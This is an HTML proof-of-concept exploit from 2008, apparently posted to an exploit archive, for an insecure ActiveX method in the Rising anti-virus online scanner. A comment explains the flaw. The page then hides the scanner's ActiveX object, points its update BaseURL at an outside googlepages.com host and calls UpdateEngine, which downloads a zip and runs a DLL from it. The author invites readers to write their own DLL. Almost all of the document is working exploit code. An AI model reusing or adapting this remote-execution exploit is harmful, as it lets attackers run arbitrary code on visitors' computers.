@@ -1,0 +1,29 @@
+<!--
+- Rising is a popular anti-virus product around China.
+- there's an insecure method flaw inside its free online scanner.
+- it's quite easy to exploit the bug which leads to a remote execution.
+- visit http://online.rising.com.cn/free/index.htm to install the ActiveX first.
+- the demonstration below will download http://jsmith080220.googlepages.com/olupdate.zip and
+  launch olupdate.dll inside the package.
+- you can code olupdate.dll yourself, in this case, I played with harmless calc.exe
+-->
+<html>
+<head><title>Rising Online Scanner Insecure Method Vulnerability</title></head>
+<body>
+<object style="display:none" classid="clsid:E4E2F180-CB8B-4DE9-ACBB-DA745D3BA153" height="265" id="rav" width="430" VIEWASTEXT>
+<param NAME="BackColor" VALUE="#ECECEC">
+<param NAME="ForeColor" VALUE="#000000">
+</object>
+<script>
+function test()
+{
+rav.BaseURL = "http://jsmith080220.googlepages.com/";
+rav.Encardid = "0000$0000$0000";
+rav.UpdateEngine();
+}
+</script>
+<input type="button" value=" Go " onclick="test()"><br><br>
+wait for a few seconds after clicking the button
+</body></html>
+
+# milw0rm.com [2008-02-25]
